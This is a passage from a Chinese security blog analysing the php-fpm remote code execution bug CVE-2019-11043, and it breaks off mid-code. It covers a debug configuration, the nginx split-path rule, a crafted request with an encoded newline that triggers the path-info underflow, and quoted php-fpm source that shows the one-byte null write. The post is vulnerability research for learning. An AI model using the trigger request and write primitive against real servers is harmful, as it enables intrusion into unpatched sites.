<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.wupco.cn/?p=4504" target="_blank" rel="noopener">http://www.wupco.cn/?p=4504</a></p>
<p><a href="https://www.freebuf.com/vuls/116398.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/116398.html</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>pwn</tag>
        <tag>学习记录</tag>
      </tags>
  </entry>
  <entry>
    <title>php-fpm RCE的POC的理解剖析(CVE-2019-11043)</title>
    <url>/2019/10/27/php-fpm%20RCE%E7%9A%84POC%E7%9A%84%E7%90%86%E8%A7%A3%E5%89%96%E6%9E%90(CVE-2019-11043)/</url>
    <content><![CDATA[<p>“此漏洞非常的棒，特别是利用写的非常的精妙，可以作为二进制结合web的漏洞利用的典范，非常值得思考和学习”,phithon师傅说。</p>
<p>同时也是因为本人也是对结合二进制的web漏洞比较感兴趣，觉得比较的好玩，所以就自己学习和分析一波，如果哪里分析的不对，希望大家可以及时的提出斧正，一起学习进步。</p>
<p><strong>对这个漏洞原理有所了解，但是想更加深入理解怎么利用的，建议直接看第五节</strong></p>
<a id="more"></a>

<h3 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h3><p>首先多说一句，<strong>纸上得来终觉浅，绝知此事需躬行</strong>，一味地下载别人的漏洞环境，用一个exp打一下毫无意义，如果真的想学，还是动手调试一下吧。 </p>
<p>我这里提供一下我的调试环境: <a href="https://github.com/wonderkun/CTFENV/tree/master/php7.2-fpm-debug" target="_blank" rel="noopener">https://github.com/wonderkun/CTFENV/tree/master/php7.2-fpm-debug</a></p>
<p>关于漏洞存在的条件就不再说了，这里可能需要说一下的是 php-fpm 的配置了:</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">error_log</span> = /proc/self/fd/<span class="number">2</span></span><br><span class="line"><span class="attr">daemonize</span> = <span class="literal">no</span></span><br><span class="line"><span class="section">[www]</span></span><br><span class="line"><span class="attr">access.log</span> = /proc/self/fd/<span class="number">2</span></span><br><span class="line"><span class="attr">clear_env</span> = <span class="literal">no</span></span><br><span class="line"><span class="attr">listen</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span></span><br><span class="line"><span class="attr">pm</span> = dynamic</span><br><span class="line"><span class="attr">pm.max_children</span> = <span class="number">5</span></span><br><span class="line"><span class="attr">pm.start_servers</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">pm.min_spare_servers</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">pm.max_spare_servers</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>我把 <code>pm.start_servers</code> <code>pm.max_spare_servers</code> 都调整成了1，这样 php-fpm 只会启动一个子进程处理请求，我们只需要 <code>gdb attach pid</code>到这个子进程上，就可以调试了，避免多进程时的一些不必要的麻烦。</p>
<h3 id="0x2-触发异常行为"><a href="#0x2-触发异常行为" class="headerlink" title="0x2 触发异常行为"></a>0x2 触发异常行为</h3><p>先看一下nginx的配置</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+?\.php)(/.*)$</span>;</span><br></pre></td></tr></table></figure>

<p><code>fastcgi_split_path_info</code> 函数会根据提供的正则表表达式, 将请求的URL(不包括?之后的参数部分)，分割为两个部分，分别赋值给变量 <code>$fastcgi_script_name</code> 和 <code>$fastcgi_path_info</code> 。 </p>
<p>那么首先在index.php中打印出 <code>$_SERVER[&quot;PATH_INFO&quot;]</code> ,然后发送如下请求</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GET /index.php/test%<span class="number">0</span>atest HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.15</span><span class="number">.166</span></span><br></pre></td></tr></table></figure>
<p>按照预期的行为，由于<code>/index.php/test%0atest</code> 无法被正则表达式 <code>^(.+?\.php)(/.*)$</code> 分割为两个部分，所以nginx传给php-fpm的变量中 <code>SCRIPT_NAME</code> 为 <code>/index.php/test\ntest</code> , <code>PATH_INFO</code> 为空，这一点很容易通过抓取nginx 和 fpm 之间的通信数据来验证。</p>
<p><code>socat -v -x   tcp-listen:9090,fork tcp-connect:127.0.0.1:9000</code></p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-20-20-01.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-20-20-01.png"></p>
<p>这里的变量名和变量值的长度和内容遵循如下定义(<a href="http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html" target="_blank" rel="noopener">参考fastcgi的通讯协议</a>):</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameData[nameLength];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB1;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameData[nameLength];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB1;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB1;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB1;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure>

<p>它把长度放在内容的前面，这样做导致我们没办法能够使得php-fpm对数据产生误解。到此为止，一切都还在我们的预期的范围内。但是 index.php 打印出来的 <code>$_SERVER[&quot;PATH_INFO&quot;]</code> 却是 “PATH_INFO”， 这就非常奇怪了。。。。 为啥传过去的<code>PATH_INFO</code>是空，打印出来却是有值的? </p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-20-28-18.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-20-28-18.png"></p>
<p>其实这个问题我和 @rebirthwyw 在做 real world CTF的时候已经注意到了，但是我并没有深层次的去看到底是为啥，错过了一个挖漏洞的好机会，真是tcl 。。。</p>
<h3 id="0x3-调试分析异常原因"><a href="#0x3-调试分析异常原因" class="headerlink" title="0x3 调试分析异常原因"></a>0x3 调试分析异常原因</h3><p><code>gdb attach</code>之后，程序会停下来，看一下栈帧，我们是停在了 <code>fcgi_accept_request</code> 函数的内部。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">► f <span class="number">0</span>     <span class="number">7f</span>1071dbe990 __accept_nocancel+<span class="number">7</span></span><br><span class="line">  f <span class="number">1</span>     <span class="number">558</span>cb067d462 fcgi_accept_request+<span class="number">147</span></span><br><span class="line">  f <span class="number">2</span>     <span class="number">558</span>cb068c95a main+<span class="number">4502</span></span><br><span class="line">  f <span class="number">3</span>     <span class="number">7f</span>1071cf52e1 __libc_start_main+<span class="number">241</span></span><br></pre></td></tr></table></figure>

<p>发一个请求，单步跟踪一下，或者全局搜索一下，发现调用点，这里<code>while True</code> 的从客户端接收请求，然后进行处理。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-20-44-37.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-20-44-37.png"></p>
<p><code>init_request_info</code> 函数是用来初始化客户端发来的请求的全局变量的，这是关注的重点。</p>
<p>单步跟踪此函数,如果开启了<code>fix_pathinfo</code>,就会进入如下尝试路径自动修复的关键代码。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-20-59-26.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-20-59-26.png"></p>
<p>在这里 <code>script_path_translated</code> 指向的就是全局变量 <code>SCRIPT_FILENAME</code>, 在这里其实就是 <code>/var/www/html/index.php/test\ntest</code>。红色箭头执行的函数 <code>tsrm_realpath</code> 是一个求绝对路径的操作，因为<code>/var/www/html/index.php/test\ntest</code>路径不存在,所以<code>real_path</code> 是 NULL，进入后面的 <code>while</code> 操作， 这里 <code>char *pt = estrndup(script_path_translated, script_path_translated_len);</code> 是一个 malloc + 内容赋值的操作， 所以 pt存储的字符串也是 <code>/var/www/html/index.php/test\ntest</code>。 </p>
<p>看一下 while 的具体操作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((ptr = <span class="built_in">strrchr</span>(pt, <span class="string">'/'</span>)) || (ptr = <span class="built_in">strrchr</span>(pt, <span class="string">'\\'</span>))) &#123; </span><br><span class="line">	*ptr = <span class="number">0</span>; <span class="comment">// </span></span><br><span class="line">	<span class="keyword">if</span> (stat(pt, &amp;st) == <span class="number">0</span> &amp;&amp; S_ISREG(st.st_mode)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * okay, we found the base script!</span></span><br><span class="line"><span class="comment">		 * work out how many chars we had to strip off;</span></span><br><span class="line"><span class="comment">		 * then we can modify PATH_INFO</span></span><br><span class="line"><span class="comment">		 * accordingly</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * we now have the makings of</span></span><br><span class="line"><span class="comment">		 * PATH_INFO=/test</span></span><br><span class="line"><span class="comment">		 * SCRIPT_FILENAME=/docroot/info.php</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * we now need to figure out what docroot is.</span></span><br><span class="line"><span class="comment">		 * if DOCUMENT_ROOT is set, this is easy, otherwise,</span></span><br><span class="line"><span class="comment">		 * we have to play the game of hide and seek to figure</span></span><br><span class="line"><span class="comment">		 * out what SCRIPT_NAME should be</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">int</span> ptlen = <span class="built_in">strlen</span>(pt);</span><br><span class="line">		<span class="keyword">int</span> slen = len - ptlen;</span><br><span class="line">		<span class="keyword">int</span> pilen = env_path_info ? <span class="built_in">strlen</span>(env_path_info) : <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> tflag = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">char</span> *path_info;</span><br><span class="line">		<span class="keyword">if</span> (apache_was_here) &#123;</span><br><span class="line">			<span class="comment">/* recall that PATH_INFO won't exist */</span></span><br><span class="line">			path_info = script_path_translated + ptlen;</span><br><span class="line">			tflag = (slen != <span class="number">0</span> &amp;&amp; (!orig_path_info || <span class="built_in">strcmp</span>(orig_path_info, path_info) != <span class="number">0</span>));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			path_info = env_path_info ? env_path_info + pilen - slen : <span class="literal">NULL</span>;</span><br><span class="line">			tflag = (orig_path_info != path_info);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (tflag) &#123;</span><br><span class="line">			<span class="keyword">if</span> (orig_path_info) &#123;</span><br><span class="line">				<span class="keyword">char</span> old;</span><br><span class="line"></span><br><span class="line">				FCGI_PUTENV(request, <span class="string">"ORIG_PATH_INFO"</span>, orig_path_info);</span><br><span class="line">				old = path_info[<span class="number">0</span>];</span><br><span class="line">				path_info[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">if</span> (!orig_script_name ||</span><br><span class="line">					<span class="built_in">strcmp</span>(orig_script_name, env_path_info) != <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (orig_script_name) &#123;</span><br><span class="line">						FCGI_PUTENV(request, <span class="string">"ORIG_SCRIPT_NAME"</span>, orig_script_name);</span><br><span class="line">					&#125;</span><br><span class="line">					SG(request_info).request_uri = FCGI_PUTENV(request, <span class="string">"SCRIPT_NAME"</span>, env_path_info);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					SG(request_info).request_uri = orig_script_name;</span><br><span class="line">				&#125;</span><br><span class="line">				path_info[<span class="number">0</span>] = old;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (apache_was_here &amp;&amp; env_script_name) &#123;</span><br><span class="line">				<span class="comment">/* Using mod_proxy_fcgi and ProxyPass, apache cannot set PATH_INFO</span></span><br><span class="line"><span class="comment">				 * As we can extract PATH_INFO from PATH_TRANSLATED</span></span><br><span class="line"><span class="comment">				 * it is probably also in SCRIPT_NAME and need to be removed</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				<span class="keyword">int</span> snlen = <span class="built_in">strlen</span>(env_script_name);</span><br><span class="line">				<span class="keyword">if</span> (snlen&gt;slen &amp;&amp; !<span class="built_in">strcmp</span>(env_script_name+snlen-slen, path_info)) &#123;</span><br><span class="line">					FCGI_PUTENV(request, <span class="string">"ORIG_SCRIPT_NAME"</span>, orig_script_name);</span><br><span class="line">					env_script_name[snlen-slen] = <span class="number">0</span>;</span><br><span class="line">					SG(request_info).request_uri = FCGI_PUTENV(request, <span class="string">"SCRIPT_NAME"</span>, env_script_name);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			env_path_info = FCGI_PUTENV(request, <span class="string">"PATH_INFO"</span>, path_info);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>做一个简单的解释，先去掉 <code>/var/www/html/index.php/test\ntest</code> 最后一个 <code>/</code> 后面的内容，看 <code>/var/www/html/index.php</code>这个文件是否存在，如果存在，就进入后续的操作。<br>注意几个长度：</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">ptlen 是  /<span class="keyword">var</span>/www/html/<span class="keyword">index</span>.php 的长度</span><br><span class="line">len 是 /<span class="keyword">var</span>/www/html/<span class="keyword">index</span>.php/test\ntest 的长度</span><br><span class="line">slen 是  /test\ntest 的长度</span><br><span class="line">pilen 是 PATH_INFO 的长度，因为 PATH_INFO 在此时还是为空的，所以是 <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>发生问题的关键是如下的操作:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">path_info = env_path_info ? env_path_info + pilen - slen : <span class="literal">NULL</span>;</span><br><span class="line">tflag = (orig_path_info != path_info);</span><br></pre></td></tr></table></figure>
<p>因为 <code>pilen</code> 为0，这里相当于把原来的 <code>env_path_info</code> 强行向前移动了 <code>slen</code>, 作为新的<code>PATH_INFO</code>，这里的 <code>slen</code>刚好是10。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-21-39-09.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-21-39-09.png"></p>
<p>这就解释了发生异常的原因。</p>
<h3 id="0x4-找漏洞利用点"><a href="#0x4-找漏洞利用点" class="headerlink" title="0x4 找漏洞利用点"></a>0x4 找漏洞利用点</h3><p>根据前面的分析，<code>slen</code> 是 <code>/test\ntest</code> 的长度，我们应该可以完全控制。 换句话讲，我们可以让 <code>path_info</code> 指向 <code>env_path_info</code> 指向位置的前 <code>slen</code> 个字节的地方，然后这个内容作为新的 <code>PATH_INFO</code>, 但是这并没有什么用，并不会带来漏洞利用的可能性。</p>
<p>但是需要注意到如下的操作:</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-23-20-32.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-23-20-32.png"></p>
<p>这里把 <code>path_info</code> 执行的内存地址的第一个字节，先修改成为 <code>\x0</code>，然后再修改回原来的值。其实这就是一个任意地址写漏洞，不过限制有两个：</p>
<ol>
<li>只能在<code>env_path_info</code>之前的某个位置改一个字节，并且只能把这个字节修改为<code>\x0</code></li>
<li>因为后面还有把这个字节改回来的操作，所以改这一个字节产生的影响的必须在改回来之前就已经被触发了。也就是函数调用 <code>FCGI_PUTENV(request, &quot;ORIG_SCRIPT_NAME&quot;, orig_script_name);</code> 或者 <code>SG(request_info).request_uri = FCGI_PUTENV(request, &quot;SCRIPT_NAME&quot;, env_path_info);</code> 会用到这个被修改的这一个字节，造成漏洞。</li>
</ol>
<p>这里面有一个函数调用 <code>FCGI_PUTENV</code>, 为了搞清楚这个函数，需要先看几个结构体:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_request</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>            listen_socket;</span><br><span class="line">	<span class="keyword">int</span>            tcp;</span><br><span class="line">	<span class="keyword">int</span>            fd;</span><br><span class="line">	<span class="keyword">int</span>            id;</span><br><span class="line">	<span class="keyword">int</span>            keep;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TCP_NODELAY</span></span><br><span class="line">	<span class="keyword">int</span>            nodelay;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span>            ended;</span><br><span class="line">	<span class="keyword">int</span>            in_len;</span><br><span class="line">	<span class="keyword">int</span>            in_pad;</span><br><span class="line"></span><br><span class="line">	fcgi_header   *out_hdr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *out_pos;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>  out_buf[<span class="number">1024</span>*<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>  reserved[<span class="keyword">sizeof</span>(fcgi_end_request_rec)];</span><br><span class="line"></span><br><span class="line">	fcgi_req_hook  hook;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>            has_env;</span><br><span class="line">	fcgi_hash      env;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash</span> &#123;</span></span><br><span class="line">	fcgi_hash_bucket  *hash_table[FCGI_HASH_TABLE_SIZE];</span><br><span class="line">	fcgi_hash_bucket  *<span class="built_in">list</span>;</span><br><span class="line">	fcgi_hash_buckets *buckets;</span><br><span class="line">	fcgi_data_seg     *data;</span><br><span class="line">&#125; fcgi_hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_buckets</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	           idx;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_buckets</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span>   <span class="title">data</span>[<span class="title">FCGI_HASH_TABLE_SIZE</span>];</span></span><br><span class="line">&#125; fcgi_hash_buckets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span>                  *pos;</span><br><span class="line">	<span class="keyword">char</span>                  *<span class="built_in">end</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">char</span>                   data[<span class="number">1</span>];</span><br><span class="line">&#125; fcgi_data_seg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>              hash_value;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>              var_len;</span><br><span class="line">	<span class="keyword">char</span>                     *var;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>              val_len;</span><br><span class="line">	<span class="keyword">char</span>                     *val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> *<span class="title">list_next</span>;</span></span><br><span class="line">&#125; fcgi_hash_bucket;</span><br></pre></td></tr></table></figure>

<p>结合如上的结构，就对如下代码进行一个简单的分析。<br>对于每一个 fastcgi 的全局变量，都会先对变量名进行一个 <code>FCGI_HASH_FUNC</code> 计算，计算一个 idx 索引。<code>request.env.hash_table</code>其实是一个hashmap，在里面对应的 idx 位置存储着全局变量对应的 <code>fcgi_hash_bucket</code> 结构的地址。</p>
<p>打印一下来调试一下验证这一点：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-23-57-34.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-28-23-57-34.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_PUTENV(request, name, value) \</span></span><br><span class="line">	fcgi_quick_putenv(request, name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>, FCGI_HASH_FUNC(name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>), value)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_HASH_FUNC(var, var_len) \</span></span><br><span class="line">	(UNEXPECTED(var_len &lt; <span class="number">3</span>) ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)var_len : \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[<span class="number">3</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-2</span>]) &lt;&lt; <span class="number">4</span>) + \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-1</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">		var_len)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fcgi_quick_putenv</span><span class="params">(fcgi_request *req, <span class="keyword">char</span>* var, <span class="keyword">int</span> var_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span>* val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (val == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		fcgi_hash_del(&amp;req-&gt;env, hash_value, var, var_len);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fcgi_hash_set(&amp;req-&gt;env, hash_value, var, var_len, val, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(val));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_set</span><span class="params">(fcgi_hash *h, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span> *var, <span class="keyword">unsigned</span> <span class="keyword">int</span> var_len, <span class="keyword">char</span> *val, <span class="keyword">unsigned</span> <span class="keyword">int</span> val_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>      idx = hash_value &amp; FCGI_HASH_TABLE_MASK; <span class="comment">// 127</span></span><br><span class="line">	fcgi_hash_bucket *p = h-&gt;hash_table[idx];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (UNEXPECTED(p != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (UNEXPECTED(p-&gt;hash_value == hash_value) &amp;&amp;</span><br><span class="line">		    p-&gt;var_len == var_len &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span>(p-&gt;var, var, var_len) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">			p-&gt;val_len = val_len;</span><br><span class="line">			p-&gt;val = fcgi_hash_strndup(h, val, val_len);</span><br><span class="line">			<span class="keyword">return</span> p-&gt;val;</span><br><span class="line">		&#125;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(h-&gt;buckets-&gt;idx &gt;= FCGI_HASH_TABLE_SIZE)) &#123;</span><br><span class="line">		fcgi_hash_buckets *b = (fcgi_hash_buckets*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_hash_buckets));</span><br><span class="line">		b-&gt;idx = <span class="number">0</span>;</span><br><span class="line">		b-&gt;next = h-&gt;buckets;</span><br><span class="line">		h-&gt;buckets = b;</span><br><span class="line">	&#125;</span><br><span class="line">	p = h-&gt;buckets-&gt;data + h-&gt;buckets-&gt;idx; <span class="comment">// 找一个存储全局变量的空闲位置 </span></span><br><span class="line">	h-&gt;buckets-&gt;idx++;</span><br><span class="line">	p-&gt;next = h-&gt;hash_table[idx];</span><br><span class="line">	h-&gt;hash_table[idx] = p;</span><br><span class="line">	p-&gt;list_next = h-&gt;<span class="built_in">list</span>;</span><br><span class="line">	h-&gt;<span class="built_in">list</span> = p;</span><br><span class="line">	p-&gt;hash_value = hash_value;</span><br><span class="line">	p-&gt;var_len = var_len;</span><br><span class="line">	p-&gt;var = fcgi_hash_strndup(h, var, var_len); <span class="comment">// 保存 key </span></span><br><span class="line">	p-&gt;val_len = val_len;</span><br><span class="line">	p-&gt;val = fcgi_hash_strndup(h, val, val_len); <span class="comment">// 保存 val </span></span><br><span class="line">	<span class="keyword">return</span> p-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_strndup</span><span 